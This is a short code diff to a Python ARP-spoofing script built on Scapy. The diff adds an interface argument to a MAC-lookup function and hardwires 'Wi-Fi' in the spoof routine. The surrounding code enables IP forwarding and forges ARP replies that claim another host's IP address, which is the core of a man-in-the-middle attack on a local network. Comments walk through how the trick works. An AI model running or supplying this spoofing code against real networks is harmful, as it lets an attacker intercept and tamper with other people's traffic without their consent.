@@ -11,17 +11,20 @@ def enableIPRoute():
     print("IP routing enabled.")
 
 
-def getMac(ip):
+def getMac(ip, iface=None):
     # Initiates an ARP resolution between your machine and the target machine.
     # Tells the wifi router to ask "Who has <ip>? Respond with your MAC address."
     # Your IP is sent in this request by default so that the response is directly sent to your machine.
-    ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip), timeout=3, verbose=0) 
+    if iface == "Wi-Fi":
+        ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip), iface=iface, timeout=3, verbose=0)
+    else:
+         ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip), timeout=3, verbose=0)
     if ans:
         return ans[0][1].src
     
 
 def spoof(target_ip, spoofed_ip, spoofed_mac=None):
-    target_mac = getMac(target_ip)
+    target_mac = getMac(target_ip, "Wi-Fi")
     if spoofed_mac is None:
         spoofed_arp = ARP(pdst=target_ip, hwdst=target_mac, psrc=spoofed_ip, op=2)  # Unless explicitly declared in this function, ARP() will use your MAC address as the default sender MAC address
     elif spoofed_mac is not None:
